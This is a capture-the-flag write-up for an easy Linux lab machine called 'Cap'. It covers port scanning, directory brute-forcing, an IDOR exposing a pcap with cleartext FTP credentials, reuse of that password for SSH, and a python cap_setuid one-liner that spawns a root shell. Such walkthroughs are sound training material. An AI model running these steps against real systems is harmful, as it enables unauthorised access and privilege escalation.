# Writeup: Cap

**OS**: 🐧 Linux

**Level**: 🟢 Easy

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.95 scan initiated Mon Sep 15 09:40:23 2025 as: /usr/lib/nmap/nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan 10.129.186.183
Nmap scan report for 10.129.186.183
Host is up, received user-set (0.059s latency).
Scanned at 2025-09-15 09:40:23 CEST for 85s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
80/tcp open  http    syn-ack ttl 63 Gunicorn
|_http-server-header: gunicorn
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 15 09:41:48 2025 -- 1 IP address (1 host up) scanned in 85.52 seconds
```

On port 80 i found a webserver so i started a directory bruteforce with `gobuster`. This gives me `/capture` directory, which redirects to `http://10.129.186.183/data/1`. `/data` is vulnerable to an IDOR. I found a `0.pcap` file on `http://10.129.186.183/data/0`, which contains some cleartext FTP credentials: `nathan:Buck3**********`.

```shell
gobuster dir -u http://10.129.186.183/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -o gobuster_scan

/capture              (Status: 302) [Size: 220] [--> http://10.129.186.183/data/1]
```

```http
GET /data/0 HTTP/1.1
Host: 10.129.186.183
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.186.183/data/1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

```http
HTTP/1.1 200 OK
```

```shell
# 0.pcap
36	4.126500	192.168.196.1	192.168.196.16	FTP	69	Request: USER nathan
40	5.424998	192.168.196.1	192.168.196.16	FTP	78	Request: PASS Buck3**********
```

## 💥 Exploitation:

On port 21 is a FTP server running so i loggend in with the credentials from the pcap file and found `user.txt`.

```
Connected to 10.129.186.183.
220 (vsFTPd 3.0.3)
Name (10.129.186.183:dw0rsec): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||55420|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Sep 15 07:36 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||39616|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |**********************************************************************************************************************************|    33        8.70 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.57 KiB/s)
ftp> bye
221 Goodbye.
```

I also tested for password reuse since i did not found anything useful and was succesful. I could login through `ssh` with the FTP credentials.

```shell
ssh nathan@10.129.186.183
```

## 🔓 Priviledge Escalation:

I checked the usual things for privesc (groups, crontab, SUID binaries), but could not find anythong so i uploaded `linpeas` which gives me:

```
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Since i did not know how to exploit this, i found after a little bit of research on [HackTricks](https://book.hacktricks.wiki) the method to gain a root shell using `python`.

```shell
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'
id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
cat /root/root.txt
```

## 💰 Loot:

```shell
# user.txt
a218068a1f9030c2b9d01b**********

# root.txt
9ebf6e84a206463934ba08**********
```